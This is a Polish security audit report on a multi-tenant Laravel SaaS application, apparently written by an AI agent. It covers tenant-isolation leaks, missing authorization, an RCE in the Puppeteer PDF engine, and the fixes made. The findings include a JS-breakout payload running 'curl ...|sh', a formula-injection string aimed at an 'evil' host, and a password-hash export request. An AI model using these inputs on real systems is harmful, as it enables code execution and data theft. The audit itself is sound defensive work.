- **[CRITICAL — nowy, naprawiony]** Zero automatyzacji łączącej wpłatę z fakturą (brak webhooka/reconciliation) — `payment.status` w 100% ręczne pole. Do tego: asymetria walidacji `payment` między Store/Update pozwalała zapisać przez PATCH niepełny/niepoprawny obiekt `payment` (np. bez `method`, z dowolnym stringiem w `status`), co **nie failowało samego requestu, tylko każdy KOLEJNY odczyt faktury** (`PaymentStatus::from()` bez `tryFrom`, `PaymentMethodDTO::fromArray()` bez guard na `null`) — faktura stawała się trwale nieodczytywalna przez API. **Naprawione w tej sesji** (patrz niżej).
- **[CRITICAL — nowy]** `InvoiceStatusService::calculateGeneralStatus()` — cały silnik uzgadniania 5 pod-statusów (ocr/allocation/approval/delivery/payment) w jeden ogólny `status` — ma dokładnie jedno miejsce użycia w całym repo: plik demonstracyjny `Examples/StatusArchitectureExample.php`. `Invoice::updateStatusFromDTO()` — zero wywołań. Kolumna `payment_status` nigdy nie jest ustawiana przez normalny endpoint, ale `InvoiceResource` mimo to buduje `statusInfo.payment` z tej martwej kolumny — zawsze zwraca `null`, podczas gdy realny status płatności leży w zupełnie innym, ręcznie zarządzanym polu (`payment.status` w JSON). Brak reguły cross-field: `PATCH {status: "completed"}` przechodzi niezależnie od tego, czy `payment.status` faktycznie mówi "paid".
- **[HIGH]** `StoreInvoiceRequest.statusInfo.*` (poprawnie zwalidowane przez Enum) jest całkowicie odrzucane przy zapisie — `BaseFormRequest::validated()` konwertuje na `status_info`, którego nie ma w `$fillable`. Jedyne realnie zapisywane pole to top-level `status`, które (przed tą sesją) w ogóle nie miało `Enum()` — dowolny string przechodził walidację, crashując dopiero przy odczycie (cast na enum).

**Wydatek (OCR → alokacja → approval → płatność) — mapa dostępności:**

| Krok | Status |
|---|---|
| 1. Upload + start OCR | działa |
| 2. Zapis wyniku OCR do Expense | działa, ale bez walidacji (zewnętrzne, nieufne źródło) + znany crash dla nietypowej stawki VAT |
| 3. Ręczna korekta po OCR (PATCH) | **było: cichy no-op** — naprawione w tej sesji (camelCase bug, patrz niżej) |
| 4. Alokacja kosztów | broken, reachable — 403 dla każdego (znany brak `ExpensePolicy`) |
| 5. Start approval | broken, reachable — 403 z tego samego powodu, ale **architektonicznie niezależny od alokacji** |
| 6. Decyzja zatwierdzająca | unreachable w praktyce — nigdy nie powstanie `pending` egzekucja, bo krok 5 zawsze 403 |
| 7. Rejestracja płatności | unreachable — **nie istnieje żaden endpoint/kontroler/akcja** mimo kompletnego pola `payment_status`/`payment` na modelu |
| 8. Uzgodnienie statusu | martwy kod (ten sam `InvoiceStatusService` co dla faktur) |

- **[CRITICAL — nowy, naprawiony]** `UpdateExpenseRequest` miała **dokładnie ten sam bug camelCase/snake_case** co `UpdateInvoiceRequest` przed fixem — `issueDate`/`totalNet`/`totalTax`/`totalGross`/`exchangeRate` nigdy nie trafiały do `validated()`, PATCH zwracał 200 OK, nic się nie zmieniało. W połączeniu z krokiem 2 (błąd OCR): **użytkownik nie miał żadnego działającego sposobu, by poprawić źle odczytaną przez OCR kwotę** — musiałby skasować i wgrać dokument od nowa. **Naprawione w tej sesji.**
- **[HIGH]** `StartApprovalWorkflowAction::canStartApproval()` sprawdza wyłącznie ogólny `status === PROCESSING`, nie `allocation_status` — approval NIE zależy architektonicznie od alokacji. Naprawienie samego brakującego `ExpensePolicy` (odłożone jako known-issue z Fazy 2) odblokowałoby jednocześnie oba kroki, bo obie ścieżki używają tej samej bramki `authorize('update', $expense)`. Oznacza to też, że fixy z Fazy 3 do `ApprovalResolutionService` są dziś **nieosiągalne end-to-end** — zablokowane przez osobno odłożony finding z Fazy 2, co nie było widoczne przy przeglądzie per-domena.
- **[CRITICAL]** Zero endpointu/kontrolera/akcji do rejestrowania płatności wydatku — sytuacja gorsza niż w Invoice (tam przynajmniej pole jest ręcznie ustawialne przez update).
- **[HIGH]** `AllocateExpenseAction` nigdy nie ustawia `allocation_status` (potwierdzenie/rozszerzenie Fazy 2). `status` ogólny wydatku nigdy nie przesuwa się poza `PROCESSING` — raz przetworzony przez OCR wydatek utyka tam na zawsze, niezależnie od losu alokacji/zatwierdzenia.

### Naprawa błędów z pierwszego realnego runu Docker/PHPStan/PHPUnit (2026-07-02)

Pierwszy raz w tej sesji zweryfikowano fixy przez faktyczne `composer larastan` + `artisan test` (nie tylko `php -l`) — zobacz `REVIEW_LOCAL_QUALITY_RUN.md`. Wynik: 3 błędy PHPStan, 6 failed / 269 passed / 31 skipped PHPUnit. Wszystkie naprawione:

1. **PHPStan (3× `ApprovalResolutionService.php`)** — `active()`/`primary()` pochodzą z `OrgUnitUserBuilder` (przez `OrgUnitUser::newEloquentBuilder()`), niewidoczne dla PHPStan na typie zwracanym `HasMany`. Dodano `@phpstan-ignore-next-line`, zgodnie z istniejącym już w kodzie wzorcem dla identycznego ograniczenia (`OrganizationUnit::activeOrgUnitUsers()`).
2. **`ApplicationInvitationControllerTest` ×2** — `Auth::payload()` rzuca `JWTException` zamiast zwracać `null`, gdy nie ma parsowalnego tokenu — operator `?->` w `EnsureTwoFactorVerified` nie chronił przed wyjątkiem, tylko przed `null`. W produkcji middleware siedzi za `auth:api` (token już sparsowany), ale to realne ryzyko crasha dla innych ścieżek auth. Owinięto w try/catch, przepuszczając request dalej — zgodnie z własną deklarowaną intencją middleware'u ("users without an applicable mfa claim are unaffected").
3. **`ProcessContractorRegistryConfirmationJobTest` (1 test)** — `confirmContractorData()` faktycznie zwraca `RegistryConfirmation[]`, a mock w teście zwracał surowe tablice z kluczem `success` — nieaktualny kształt sprzed fixu z Fazy 1. Poprawiono mock, by budował prawdziwą (nieprezystowaną) instancję `RegistryConfirmation`.
4. **`SkillCategoryApiTest` ×3** — `create/update/destroy` wymagają teraz Owner/Admin (Faza 3), ale `setUp()` autentykował usera bez żadnego tenanta (`getTenantId()` = null, `authorizeManage()` zawsze odrzucał). Naprawiono na `authenticateUser($tenant)` — ten sam, już działający wzorzec co `SkillApiTest` (hook `UserTenant::boot()` automatycznie synchronizuje rolę z pivota do `TenantScopedRoles`).

**Nadal nienaprawione (świadomie, poza zakresem tego batcha):** backfill migracji na realnej kopii danych, `EDoreczenia`/PKWiU/Contact-search (Scout) — 31 skipped testów, świadomie pominięte w suite.

### Naprawione critical findings z Fazy 3, Grupa A (2026-07-02)

Wszystkie ~12 aktywnie eksploatowalne critical findings z Fazy 3 naprawione bezpośrednio (weryfikacja tylko `php -l`, patrz zastrzeżenie na końcu):

1. **RCE w silniku PDF Puppeteer.** `PuppeteerEngine::generatePuppeteerScript()` interpolowała wartości z `InvoiceTemplate.settings` (pole edytowalne przez każdego z `invoice_templates.manage`, bez schematu walidacji) bezpośrednio w źródle JS wykonywanym przez `exec()`. Naprawiono strukturalnie: wszystkie ustawienia zapisywane teraz do pliku JSON i wczytywane w skrypcie przez `JSON.parse()` (nie da się z tego "wyjść" niezależnie od treści), plus każda wartość jest typowana/walidowana w `resolveScriptSettings()` jako dodatkowa warstwa obrony. Dodatkowo naprawiono SSRF — usunięto `--disable-web-security`, przywrócono `--disable-javascript` w `config/pdf.php` (treść szablonu to HTML kontrolowany przez tenanta, renderowany w tej samej headless-przeglądarce).
2. **`InvoiceTemplatePolicy` pozwalała mutować globalne szablony każdemu.** Rozdzielono `belongsToUserTenant()` (view/create — globalne szablony jako legalny fallback do odczytu) i nowe `ownedByUserTenant()` (update/delete/restore/forceDelete/setDefault — musi być szablon własnego tenanta). Zarejestrowano też politykę explicite w `AuthServiceProvider` (jedyna w projekcie polegająca na auto-discovery). Dodatkowo `InvoiceTemplateController::store/update` waliduje teraz składnię Handlebars przed zapisem (wcześniej walidacja istniała w serwisie, ale kontroler go omijał).
3. **Export: `columns[]` z requestu całkowicie nadpisywał bezpieczną whitelistę.** `BaseExport::resolveColumns()` teraz przecina żądane kolumny z whitelistą podklasy zamiast ją zastępować — `columns[]=assignee.password` już nie zwraca zahashowanego hasła. Dodano brakujące domyślne whitelisty do `ExpensesExport`/`InvoicesExport`/`TasksExport` (wcześniej puste = zawsze pusty plik bez override). Dodano ochronę przed CSV/Excel formula injection (`BaseExport::neutralizeFormula()` — prefiks `'` dla wartości zaczynających się od `=+-@`).
4. **Brak autoryzacji na eksporcie Invoice/Task/Expense.** Dodano `authorizeManage()` (Owner/Admin), analogicznie do Contractors/Products naprawionych w Fazie 2.
5. **`PublicUserController::show()` — wyciek email/telefonu/daty urodzenia całego systemu.** `UserPreference::isFieldVisibleInTenant()` nigdy nie sprawdzała, czy pytający faktycznie dzieli tenanta z właścicielem profilu. Dodano `HasUsersTenantScopedFields::isFieldVisibleToViewer()` z realnym sprawdzeniem przecięcia członkostw tenantowych, oraz wymóg współdzielonego tenanta w samym kontrolerze (403 zamiast zwracania profilu każdemu).
6. **`UserPreferenceController` (jedyny sposób ograniczenia powyższego) nie miał zarejestrowanej trasy.** Zarejestrowano pod `user/preferences`.
7. **`ApprovalResolutionService` — UNIT_ROLE nigdy się nie rozwiązywał.** `getUserPrimaryUnit()`/`getUsersWithRoleInUnit()` wołały nieistniejące metody (`organizationUnitMemberships()`/`memberships()`), cicho połykane przez `method_exists()`. Przepisano na realne relacje (`User::orgUnitUsers()`, `OrganizationUnit::orgUnitUsers()`, scope'y `active()`/`primary()` z `OrgUnitUserBuilder`).
8. **`resolveSystemPermissionApprover()` bez tenant-scopingu.** Dodano `TenantScopedRoles::userIdsWithPermission()` (ten sam wzorzec surowych zapytań co `userHasAnyRole()`, sprawdza zarówno bezpośrednie nadania jak i uprawnienia dziedziczone przez rolę) i przeskopowano do `tenant_id` wydatku.
9. **Cross-tenant leak w `ExpenseApprovalController::pendingApprovals/approvalHistory`.** `ApprovalExpenseExecution`/`ApprovalStepApprover` nie mają własnego `tenant_id`. Dodano `whereHas('expense')`, co niejawnie stosuje globalny scope `BelongsToTenant` z modelu `Expense`.
10. **Cross-tenant DM w Chat.** `CreateDirectMessageRoomRequest` walidowała `userId` tylko jako `exists:users,id`, bez ograniczenia do tenanta. Dodano sprawdzenie członkostwa w `DirectMessageController::createRoom()`.
11. **Skills — globalny słownik bez autoryzacji.** Dodano `authorizeManage()` (Owner/Admin) do `store/update/destroy` w `SkillController`/`SkillCategoryController` — wcześniej dowolny user mógł kaskadowo skasować dane wszystkich tenantów.
12. **`InvoiceShareTokenController::store()` zawsze rzucał wyjątek DB.** Walidacja nie ustawiała `token`/`shareable_type` (NOT NULL). Podpięto istniejący, wcześniej martwy `ShareTokenService::createToken()` (generuje krypto-bezpieczny token). Naprawiono też `HasShareTokens::shareTokens()` (`morphMany` zamiast `hasMany` ignorującego `shareable_type`) i dodano `min:1` do `maxUsage`.

**Świadomie NIE naprawiono w tej sesji:**
- Publiczny endpoint odbioru share-tokenu nadal nie istnieje — `store()`/`destroy()` działają poprawnie, ale funkcja "publiczny link do faktury" wciąż nic nie udostępnia end-to-end. To luka funkcjonalna (nowa funkcja do zbudowania), nie bug do załatania — celowo odłożone zamiast zgadywania architektury na ślepo bez możliwości testów.
- `ChatMessage`/`ChatParticipant` nadal mają martwą kolumnę `tenant_id` (zakomentowany `BelongsToTenant`) — HIGH, nie CRITICAL, główna dziura (cross-tenant DM creation) już zamknięta na poziomie kontrolera.
- Reszta HIGH/MEDIUM/LOW z Fazy 3 (m.in. cała domena Projects/Task camelCase-crash w Calendar, `EventPolicy` brak, `FeedCommentController::destroy` trwale nieosiągalny przez brakujący segment trasy, `AdminContractorController` cicho gubiący `vatId`/`taxId`) — odłożone jako known-issue, zgodnie z ustalonym wzorcem Grupa B.

**Zastrzeżenie (jak w poprzednich fazach):** brak `vendor/`/DB w tym środowisku — wszystko zweryfikowane wyłącznie `php -l`. Fix RCE w Puppeterze w szczególności wymaga przetestowania na realnym pobraniu PDF faktury (z ustawieniami szablonu, które wcześniej łamałyby skrypt) przed uznaniem za zweryfikowany.

### Faza 3 — Template, Export

**Wzorzec:** to najpoważniejsza para findingów w całym przeglądzie do tej pory — silnik PDF (Puppeteer, domyślny w tej aplikacji) buduje skrypt Node.js przez surową interpolację stringów z pola JSON kontrolowanego przez zwykłego tenant-usera i wykonuje go przez `exec()`, co daje **realne zdalne wykonanie kodu**. Domena Export ma równoległy, osobny problem tej samej klasy co IDOR: lista eksportowanych kolumn jest w 100% sterowana przez klienta, bez whitelisty, co pozwala ominąć `$hidden` na modelach (np. wyciągnąć zahashowane hasło przypisanego usera przez `columns[]=assignee.password`) — a 3 z 5 endpointów eksportu (Invoice/Task/Expense) w ogóle nie mają autoryzacji, mimo że analogiczne (Contractors/Products) dostały ją w Fazie 2.

**Template:**

- **[CRITICAL — RCE]** `PuppeteerEngine::generatePuppeteerScript()` buduje plik `.js` przez surową interpolację stringów (np. `format: '{$settings['format']}'`) bez żadnego escapowania, po czym uruchamia go przez `exec("timeout ... node script.js")`. Wartość `settings` pochodzi wprost z `InvoiceTemplate.settings` (pole JSON walidowane tylko jako `['nullable','array']` — brak schematu pól) i trafia tam bez sanityzacji. **Każdy user z uprawnieniem `invoice_templates.manage` (role Admin/Owner/Manager/FinancialManager) może ustawić `settings.format` na string zrywający literał JS (np. zawierający `'); require('child_process').execSync('curl ...|sh'); //`) i wykonać dowolny kod na serwerze przy pobraniu PDF faktury.** Puppeteer jest domyślnym silnikiem PDF w tej aplikacji (`config/pdf.php: PDF_ENGINE=puppeteer`), nie opcjonalną ścieżką — to nie jest brzegowy przypadek.
- **[HIGH — SSRF]** `config/pdf.php` (`chrome_flags`) NIE zawiera `--disable-javascript` (w przeciwieństwie do wewnętrznego fallbacku w kodzie) i ZAWIERA `--disable-web-security` (CORS wyłączony). Treść szablonu (`InvoiceTemplate.content`) to w pełni kontrolowany przez tenant-usera surowy HTML/Handlebars — `<script>` w treści szablonu wykonuje się w serwerowej headless-przeglądarce z JS włączonym i CORS wyłączonym, co pozwala na SSRF do usług wewnętrznych/metadata endpointów z możliwością odczytu odpowiedzi i eksfiltracji przez kolejny `fetch`.
- **[MEDIUM]** `InvoiceTemplateService::create()/update()` waliduje składnię Handlebars przed zapisem, ale to martwy kod — `InvoiceTemplateController::store()/update()` wywołuje bezpośrednio `InvoiceTemplate::create()`/`->update()` na modelu, całkowicie pomijając serwis. Błędny szablon da się zapisać bez ostrzeżenia, wybuchnie dopiero przy generowaniu PDF.
- **[MEDIUM]** Globalne szablony systemowe (`tenant_id = null`, fallback dla wszystkich tenantów bez własnego domyślnego) mogą być edytowane/usuwane/przełączane jako domyślne przez DOWOLNEGO tenant-usera z `invoice_templates.manage`, nie tylko super-admina — `InvoiceTemplatePolicy` uznaje `tenant_id === null` za zawsze autoryzowane. Jeden zły/przejęty Manager w jednej firmie może zepsuć domyślny szablon używany przez wszystkie inne tenanty.
- **[LOW]** `InvoiceTemplateController::update()` odwołuje się bezwarunkowo do `$data['category']` mimo że pole jest `sometimes` — PATCH bez `category` daje "Undefined array key". Porównanie enum vs string przy detekcji zmiany kategorii jest zawsze `true` (martwa logika).
- **[LOW]** `InvoiceTemplatePolicy` jako jedyna polisa w projekcie NIE jest zarejestrowana w `AuthServiceProvider::$policies` — dziś działa dzięki Laravel auto-discovery, ale kruche (cicha zmiana na deny-all przy przeniesieniu klasy, bez błędu) i niespójne z resztą kodu, gdzie 10 innych polis jest rejestrowanych explicite.
- **[LOW]** Zero testów dla całej domeny Template.

**Export:**

- **[CRITICAL]** Dowolne ujawnianie kolumn/relacji przez parametr `columns` z requestu — `BaseExport::__construct()` pozwala klientowi całkowicie nadpisać bezpieczną domyślną whitelistę. `BaseExport::map()` używa `data_get($row, $col)`, co przez magiczny `__get` Eloquenta **omija `$hidden`** (egzekwowane tylko w `toArray()/toJson()`) i doładowuje dowolne relacje niezależnie od `allowedIncludes()`. **Przykład: `columns[]=assignee.password` na `/tasks/export` zwraca zahashowane hasło przypisanego usera.** Dotyczy wszystkich 5 klas eksportu.
- **[CRITICAL]** Brak autoryzacji na 3 z 5 endpointów eksportu: `InvoiceController::export()`, `TaskController::export()`, `ExpenseController::export()` nie mają żadnego `$this->authorize()`/sprawdzenia roli — dowolny zalogowany user (nawet rola `User` z zerowymi uprawnieniami) może zrzucić masowo wszystkie faktury/zadania/wydatki. Dla kontrastu `ContractorController::export()`/`ProductController::export()` poprawnie mają `authorizeManage()` (Owner/Admin) — naprawione w Fazie 2, ale ten sam fix nie objął Invoice/Task/Expense.
- **[HIGH]** CSV/Excel Formula Injection (CWE-1236) — `BaseExport::map()` zwraca surowe wartości pól bez sanityzacji wiodących `=`/`+`/`-`/`@`. String typu `=HYPERLINK("http://evil/","x")` wpisany w dowolne pole tekstowe (nazwa kontrahenta, tytuł zadania...) trafia do `.xlsx` jako żywa formuła, wykonująca się przy otwarciu w Excelu przez pracownika. Żadna z 5 klas eksportu tego nie neutralizuje.
- **[MEDIUM]** `ExpensesExport`/`InvoicesExport` nie definiują domyślnego `$columns` (dziedziczą puste), w przeciwieństwie do `ContractorsExport`/`ProductsExport` — bez jawnego `columns` w requeście te dwa eksporty dają pusty plik, a jedynym sposobem uzyskania danych jest ręczne podanie surowych ścieżek kolumn/relacji, czyli dokładnie to, co umożliwia finding #1.
- **[MEDIUM]** Potwierdzenie znanego z Fazy 2 findingu: `ExpensesExport::baseQuery()` nadal nie filtruje `approval_status` — wydatki draft/rejected/pending nadal trafiają do eksportu razem z zatwierdzonymi, brak fixu na poziomie domeny Export.
- **[LOW]** Brak limitu wierszy i brak kolejkowania — żadna z 5 klas eksportu nie implementuje `WithChunkReading`/`ShouldQueue`, `ExportService::download()` działa synchronicznie w ramach requestu — potencjalny DoS/timeout dla dużego tenanta.
- **[LOW]** Zero testów dla całej domeny Export.

### Faza 3 — Approval, Users

**Wzorzec:** silnik workflow (Approval) ma poprawny szkielet stanów, ale kluczowa logika rozwiązywania zatwierdzających odwołuje się do nieistniejących relacji (cicho połykane przez `method_exists()`) i nie stosuje tenant-scopingu do uprawnień systemowych — część typów zatwierdzających jest martwa, część dziurawa międzytenantowo. W Users trzy dobrze zaimplementowane Policy kontrastują z całkowicie nieautoryzowanym `PublicUserController`, którego jedyny "wentyl bezpieczeństwa" (widoczność pól per-tenant) jest złamany logicznie i dodatkowo nieosiągalny przez API (kontroler ustawień prywatności nie ma zarejestrowanej trasy) — czyli wyciek danych osobowych bez żadnej możliwości wyłączenia.

**Approval:**

- **[CRITICAL]** `ApprovalResolutionService::resolveUnitRoleApprover()`/`getUserPrimaryUnit()`/`getUsersWithRoleInUnit()` wołają `$user->organizationUnitMemberships()`/`$unit->memberships()` — te metody **nie istnieją** (rzeczywiste relacje to `User::orgUnitUsers()`/`OrganizationUnit::orgUnitUsers()` przez model `OrgUnitUser`). Osłony `method_exists()` cicho połykają błąd i zwracają pustą kolekcję. **Typ zatwierdzającego `UNIT_ROLE` nigdy nie rozwiąże żadnego zatwierdzającego — każdy krok workflow z tym typem zawiesza się w `pending` na zawsze.**
- **[CRITICAL]** `ApprovalResolutionService::resolveSystemPermissionApprover()` — zapytanie `User::whereHas('permissions', ...)` **bez filtrowania po tenant/team_id**, nie przechodzi przez `TenantScopedRoles`-owy odpowiednik (którego dla permissions w ogóle nie ma). Zwraca **wszystkich userów w całej bazie** z danym uprawnieniem, niezależnie od tenanta — typ `SYSTEM_PERMISSION` może uczynić zatwierdzającym usera z zupełnie innej firmy.
- **[CRITICAL]** `ExpenseApprovalController::pendingApprovals()`/`approvalHistory()` — `ApprovalExpenseExecution`/`ApprovalStepApprover` **nie mają `tenant_id`/`BelongsToTenant`**, filtr wyłącznie po `approver_value === $user->id`. User należący do wielu tenantów (via `belongsToMany`), zalogowany w kontekście Tenanta B jako zatwierdzający z Tenanta A, zobaczy w `GET /expenses/pending-approvals`/`/approval-history` pełne dane (kwoty, historia decyzji, uzasadnienia) **z cudzego tenanta**.
- **[HIGH]** Race condition w `ProcessApprovalDecisionAction::execute()` — `validateExecution()` sprawdza `isPending()` na obiekcie wczytanym PRZED transakcją, bez `lockForUpdate()`. Dwie równoległe decyzje (approve + reject) na tym samym kroku mogą obie przejść walidację — "last write wins" może nadpisać już zatwierdzone wykonanie na `REJECTED` mimo że stan miał być terminalny. `ApprovalExecutionStatus::canTransitionTo()` istnieje właśnie po to, ale nigdzie nie jest wywoływane w tym Action — martwy kod.
- **[HIGH]** Brak jakiegokolwiek CRUD do zarządzania `ApprovalWorkflow`/`ApprovalWorkflowStep`/`ApprovalStepApprover` — brak Controllers/Requests/Resources w domenie, jedyny sposób ich powstania to `factory()` w testach. "Flexible workflow engine" jest w praktyce nieużywalny przez żadnego tenanta (README już to oznacza jako nieukończone — zgodne z rzeczywistością).
- **[MEDIUM]** `ExpenseApprovalController::show/processDecision/canApprove` nie wołają `$this->authorize()` na `$expense` (w przeciwieństwie do `startApproval()`) — każdy user danego tenanta widzi pełną historię decyzji dowolnego wydatku, niezależnie czy ma z nim związek.
- **[MEDIUM]** Testy iluzoryczne: unit test na `ApprovalResolutionService` sprawdza tylko `assertInstanceOf`/`method_exists`, zero asercji na rzeczywiste zachowanie — dokładnie tam, gdzie siedzą oba CRITICAL. Żaden test nie uderza w trasy HTTP `ExpenseApprovalController`, więc cross-tenant leak nigdy nie zostanie wyłapany przez CI.
- **[LOW]** Unique constraint na `approval_step_approvers` nie chroni przed duplikatami gdy `organization_unit_id IS NULL` (Postgres `NULL != NULL`).

**Users:**

- **[CRITICAL]** `PublicUserController::show(User $user)` (`GET v1/users/{user}`) — **zero autoryzacji**. `User` nie ma tenant-scope, więc implicit route binding rozwiązuje dowolny user ID w systemie; `is_in_tenant` sprawdza tylko że wołający MA jakiś `tid`, nie że `{user}` należy do tego tenanta. **Dowolny zalogowany user dowolnej firmy pobiera profil dowolnego innego usera w całym systemie.**
- **[CRITICAL]** `UserPreference::isFieldVisibleInTenant()` **nie sprawdza, czy pytający jest w tym samym tenancie co właściciel profilu** — sprawdza tylko `'public'|'tenant'|'hidden'`, traktując `'tenant'` jako zawsze-widoczne. Domyślna widoczność email/telefonu/daty urodzenia to `'tenant'`. W połączeniu z findingiem powyżej: **email, telefon i data urodzenia każdego usera w systemie są domyślnie widoczne dla kogokolwiek** trafiającego na `PublicUserController::show`.
- **[CRITICAL]** Jedyny sposób ograniczenia powyższego (`UserPreferenceController::update/reset`) **nie jest zarejestrowany w żadnym pliku routes** — całkowicie nieosiągalny przez API. Użytkownicy nie mają żadnej możliwości wyłączenia wycieku z dwóch findingów powyżej.
- **[HIGH]** `Route::get('users/search', [PublicUserController::class, 'search'])` wskazuje na metodę, której **nie ma** w kontrolerze (`BadMethodCallException`/500) — martwa/zepsuta trasa.
- **[MEDIUM]** Martwy/zduplikowany kod: `Users\Requests\UpdateProfileRequest`/`UpdateProfilePrivacyRequest` nieużywane przez żaden kontroler (realny endpoint korzysta z `Auth\Requests\UpdateUserProfileRequest`). Dwa równoległe, nakładające się systemy ustawień (`Users\Models\UserPreference` vs `Auth\Models\UserSettings`) — tylko jeden realnie podłączony pod trasy.
- **[MEDIUM]** Zerowe pokrycie testami: `UserTableSettingController`/`TrustedDeviceController`/`SecurityEventController`/`NotificationSettingController`/`PublicUserController` — brak jakichkolwiek testów, stąd CRITICAL wyciek nigdy niewykryty.
- **[LOW]** `user/profile-image/{user}` w pełni publiczna (bez `auth:api`), bez tenant-checku, strumieniuje surowe media — odstaje od wzorca `HasMediaSignedUrls` z CLAUDE.md.
- **[LOW]** `visibilityPerTenant.*` (ID tenanta) niewalidowane względem faktycznych członkostw usera.
- **[LOW]** `NotificationSettingController` pozwala na dowolne stringi `channel`/`settingKey` zamiast `Enum` rule — literówka w kluczu cicho tworzy nic-nie-robiący rekord.
- Pozytyw: `UserTableSettingPolicy`/`TrustedDevicePolicy`/`SecurityEventPolicy` poprawnie zaimplementowane i zarejestrowane.

### Faza 3 — Chat, Skills, Admin

**Wzorzec:** trzy różne warianty tego samego rdzenia problemu — brak spójnej bramki autoryzacji tam, gdzie jest potrzebna (Chat: brak weryfikacji tenanta drugiej strony DM; Skills: globalny słownik bez żadnej autoryzacji, kaskadowe FK dają cross-tenant DoS), oraz w Admin — bramka `is_admin` jest poprawnie zaprojektowana (brak kolizji z tenant-scoped `RoleName::Admin`, wbrew wstępnej hipotezie), ale panel admina cicho gubi dane przez ten sam wzorzec camelCase/snake_case co w innych domenach.

**Chat:**

- **[CRITICAL]** `CreateDirectMessageRoomRequest`/`DirectMessageController::createRoom` — `userId` walidowany tylko jako `exists:users,id`, **bez ograniczenia do bieżącego tenanta**. `DirectMessageService::findOrCreateRoom()` nie weryfikuje `$otherUser->getTenantId() === $currentUser->getTenantId()`. **Dowolny zalogowany user może podać `userId` DOWOLNEGO tenanta w systemie i wymusić utworzenie pokoju DM + dopisanie go jako uczestnik** — przełamanie izolacji tenantów, cross-tenant messaging bez zgody drugiej strony.
- **[HIGH]** `ChatMessage`/`ChatParticipant` mają **zakomentowany** `use BelongsToTenant;`, mimo że obie tabele mają kolumnę `tenant_id`. Pole nie jest w `$fillable` żadnego modelu, więc zawsze `NULL` — martwa kolumna zaprojektowana pod tenant scoping, którego nikt nie egzekwuje na poziomie zapytań. `MessageController::sendMessage` próbuje przekazać `tenant_id`, ale mass assignment cicho to odrzuca.
- **[MEDIUM]** Autoryzacja czatu robiona ręcznym `if (!$room->isUserParticipant(...))` zamiast Policy — brak `ChatRoomPolicy`/wpisu w `AuthServiceProvider`, niespójne z resztą architektury.
- **[MEDIUM]** AI chat (`AiChatController`/`AiConversationService::buildMessages()`) buduje historię wyłącznie z `history` przysłanej przez klienta, bez odtwarzania z własnej bazy i bez sanityzacji — otwiera drogę do prompt injection (klient wstrzykuje spreparowane wiadomości `role: assistant` do historii), ograniczone tylko miękko przez sam system prompt.
- **[LOW]** `AiChatRequest` bez `max:` na `message`/limitu `history` — brak ochrony przed nadużyciem kosztowym płatnego API OpenRouter.
- **[LOW]** `MessageController` zawiera zaszyty kod demo/dev (`sendDummyMessage()`, hardcoded bot user ID, cytaty z `Illuminate\Foundation\Inspiring`) bezpośrednio w kontrolerze produkcyjnym (warunkowo dla `local`, ale architektonicznie nie powinno tam być).
- **[LOW]** Zero testów dla całej domeny Chat — krytyczny bug cross-tenant messaging niewykryty.
- Kanały WebSocket (`routes/channels.php`) poprawnie weryfikują członkostwo — ale poprawność zależy w 100% od tego, że `ChatParticipant` nigdy nie powstanie dla złego usera, co jest właśnie złamane przez CRITICAL powyżej.

**Skills:**

- **[CRITICAL]** `SkillController`/`SkillCategoryController` — zero autoryzacji poza `auth:api`/`is_active` (`authorize()` zwraca `true` bezwarunkowo). `Skill`/`SkillCategory` to modele **globalne, współdzielone między wszystkimi tenantami** (brak `tenant_id`). W połączeniu z `ON DELETE CASCADE` (`skills→skill_categories`, `project_required_skills→skills`, `user_skill→skills`): **dowolny zwykły użytkownik dowolnego tenanta może skasować kategorię i kaskadowo wszystkie powiązane umiejętności oraz WSZYSTKIE powiązania innych tenantów korzystających z tych umiejętności** — realny cross-tenant DoS/niszczenie danych bez żadnego uprawnienia. Istniejący test wręcz potwierdza to jako "działające zgodnie z oczekiwaniami" — brak testu granicy autoryzacji.
- **[MEDIUM]** Ten sam brak autoryzacji dotyczy `store`/`update` — każdy user może zmieniać globalny słownik widoczny u innych tenantów.
- **[LOW]** `UserSkillController` poprawnie ograniczony do właściciela — kontrastujący dobry wzorzec w tej samej domenie.

**Admin:**

- **[GOOD/INFO]** Bramka `is_admin` (kolumna boolean na `User`, middleware `IsAdmin`) jest **poprawnie niezależna** od tenant-scoped `RoleName::Admin` — brak kolizji nazewniczej/eskalacji uprawnień sugerowanej jako hipoteza ryzyka. Weryfikacja przez `AdminAuthController` (dostęp do Telescope) też spójna.
- **[HIGH]** `AdminContractorController::store/update` — `(array) $dto` na `ContractorDTO` daje klucze camelCase (`vatId`, `taxId`, `isActive`...), a `Contractor::$fillable` jest snake_case. Mass assignment cicho pomija te pola — **edycja kontrahenta przez panel admina jest w dużej części no-opem** (API zwraca 200/201 sugerujące sukces, dane realnie się nie zapisują). Ten sam wzorzec bugu co już naprawiany gdzie indziej w tej sesji (camelCase DTO → snake_case fillable).
- **[HIGH]** `StoreContractorRequest`/`UpdateContractorRequest::prepareForValidation()` bezwarunkowo nadpisują `tenantId` na tenant **aktualnie zalogowanego admina**, mimo że `BaseFormRequest::checkTenantId()` ma explicit bypass dla adminów. Deweloper dodał obejście dla admina w jednym miejscu, zapomniał w drugim — **panel Admin nie jest w stanie utworzyć/przenieść kontrahenta dla innego tenanta**, mimo że to najbardziej oczywisty use-case takiego panelu. Niespójne z `ProductRequest`, który tego nie robi.
- **[MEDIUM]** Odwrotna strona powyższego dla Produktów: `ProductRequest` (w przeciwieństwie do Contractor) poprawnie honoruje `tenantId` z requesta (klucze snake_case się zgadzają) — ale to oznacza, że błąd w warstwie frontendowej (np. formularz "create" reużyty do edycji z niewypełnionym/błędnym `tenantId`) może **realnie przypisać istniejący produkt do innego tenanta**. Do zweryfikowania po stronie `saasbase-web`.
- **[MEDIUM]** Oba kontrolery Admin używają ad-hoc `Model::withoutGlobalScope(TenantScope::class)` w każdej metodzie zamiast udokumentowanego `Tenant::bypassTenant()`. Odejście od wzorca z CLAUDE.md — praktyczna konsekwencja: `withoutGlobalScope` na query top-level nie propaguje się na później ładowane relacje (`->load(['unit','vatRate'])`), więc dociąganie ich dla rekordu z cudzego tenanta może po cichu zwrócić puste wyniki, jeśli te relacje same są tenant-scoped (niepotwierdzone empirycznie, ale architektonicznie kruche).
- **[MEDIUM]** `is_admin` jest w `$fillable` modelu `User` — dziś brak znalezionej bezpośredniej ścieżki eskalacji (żaden sprawdzony endpoint nie robi `$user->update($request->validated())` wprost na `User`), ale to latentne ryzyko samo-nadania uprawnień admina przy przyszłym endpoincie bez `except('is_admin')`.
